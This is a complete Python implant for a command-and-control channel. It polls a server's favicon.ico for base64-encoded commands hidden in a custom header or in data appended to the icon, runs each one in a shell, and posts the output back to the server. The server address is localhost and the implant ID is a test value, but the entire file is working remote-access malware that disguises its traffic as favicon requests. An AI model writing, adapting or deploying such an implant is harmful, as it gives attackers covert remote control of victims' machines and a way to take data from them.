import requests
import base64
import time
import subprocess

C2_SERVER = "http://localhost:5000"  
IMPLANT_ID = "test_implant"         

def fetch_command():
    """
    Poll the C2 server by requesting /favicon.ico with a query parameter i=<IMPLANT_ID>.
    If a command is found, return it as a string.
    """
    url = f"{C2_SERVER}/favicon.ico?i={IMPLANT_ID}"
    try:
        r = requests.get(url, timeout=10)

        # 1) Check the custom header
        encoded_cmd = r.headers.get("X-Favicon-Command")
        if encoded_cmd:
            try:
                return base64.b64decode(encoded_cmd).decode()
            except:
                return None

        # 2) Check if there's appended data in the ICO (marker: b"CMD:")
        content = r.content
        marker = b"CMD:"
        idx = content.find(marker)
        if idx != -1:
            encoded_cmd = content[idx + len(marker):]
            try:
                return base64.b64decode(encoded_cmd).decode()
            except:
                return None

    except requests.RequestException as e:
        print(f"[!] Error fetching command: {e}")
    
    return None

def report_result(command, output):
    """
    Send the result of the executed command back to /report.
    """
    url = f"{C2_SERVER}/report"
    data = {
        "implant_id": IMPLANT_ID,
        "command": command,
        "output": output
    }
    try:
        r = requests.post(url, json=data, timeout=10)
        if r.status_code == 200:
            print("[+] Successfully reported result.")
        else:
            print(f"[!] Failed to report result: {r.text}")
    except requests.RequestException as e:
        print(f"[!] Error reporting result: {e}")

def main():
    print(f"[+] Starting implant with ID: {IMPLANT_ID}")
    while True:
        cmd = fetch_command()
        if cmd:
            print(f"[+] Received command: {cmd}")
            try:
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                output_str = result.decode(errors="replace")
            except Exception as e:
                output_str = f"Error executing command: {e}"

            # Send the result back
            report_result(cmd, output_str)

        # Sleep a bit before checking again (10s). 
        time.sleep(10)

if __name__ == "__main__":
    main()
